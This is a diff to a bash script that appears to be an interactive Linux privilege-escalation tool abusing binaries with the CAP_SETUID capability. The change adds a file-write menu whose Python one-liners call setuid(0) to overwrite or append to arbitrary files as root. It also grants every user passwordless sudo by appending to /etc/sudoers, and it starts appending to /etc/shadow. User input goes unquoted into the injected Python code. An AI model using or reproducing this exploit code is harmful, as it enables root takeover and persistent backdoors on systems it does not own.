@@ -254,10 +254,10 @@ while true; do
             done               
             ;;
         3)
-            echo "----- < File Read (CAP_DAC_OVERRIDE & CAP_SETUID Capabilities) > -----"
+            echo "----- < File Write (CAP_SETUID Capability) > -----"
             echo " "
             
-            if [ -z "$FileReadCap" ]; then
+            if [ -z "$FileWriteCap" ]; then
                 echo "No Vulnerables Binaries with Capabilities detected"
                 continue
             fi
@@ -266,18 +266,61 @@ while true; do
                 echo "Choose from the following : "
                 echo " "
             
-                select choice in $FileReadCap "Go Back"; do
+                select choice in $FileWriteCap "Go Back"; do
                     case "$choice" in
                         *python*)
                         
-                            read -p "What file do you want to read ? : " FILE
+                            read -p "What file do you want to edit ? : " FILE
                             
                             echo "Trying with python3..."
-                            echo "Result : "
+                            echo "Actual content of the file : "
                             echo " "
                             
                             "$choice" -c 'import os;os.setuid(0);os.system("cp '$FILE' /tmp/tempfile");print(open("/tmp/tempfile").read());os.system("rm /tmp/tempfile")'
-                        
+
+                            while true; do
+                                echo "What do you want to do?"
+                            
+                                select ANSWER in "Fully replace the file" "Append data to the file" "Enable sudo ALL" "Create Root Users (WIP)" "Go Back"; do
+                                    case "$ANSWER" in
+
+                                        "Enable sudo ALL")
+                                            "$choice" -c 'import os; os.setuid(0);open("/etc/sudoers","a").write("\nALL ALL=(ALL) NOPASSWD:ALL")'
+                                            break
+                                            ;;
+                                        "Create Root Users (WIP)")
+                                            "$choice" -c 'import os; os.setuid(0);open("/etc/shadow","a").write("\nTBD")'
+                                            break
+                                            ;;
+                                        "Fully replace the file")
+                                            read -p "What do you want to write into this file ? : " REPLACEFILE
+                                            python -c 'import os; os.setuid(0);open("'$FILE'","w+").write("'$REPLACEFILE'")'
+                                            break
+                                            ;;
+                            
+                                        "Append data to the file")
+                                            read -p "What do you want to append this file ? : " APPENDFILE
+                                            python -c 'import os; os.setuid(0);open("'$FILE'","a").write("\n'$APPENDFILE'")'
+                                            break
+                                            ;;
+                            
+                                        "Go Back")
+                                            break 2
+                                            ;;
+                            
+                                        *)
+                                            echo "Invalid choice, try again."
+                                            break
+                                            ;;
+                                    esac
+                                done
+                            done
+
+                            echo "content of the file after modification : "
+                            echo " "
+                            
+                            "$choice" -c 'import os;os.setuid(0);os.system("cp '$FILE' /tmp/tempfile");print(open("/tmp/tempfile").read());os.system("rm /tmp/tempfile")'
+
                             read -p "Do you want to read another file? [y/N] : " answer
 
                             if [[ "$answer" =~ ^[Yy]$ ]]; then
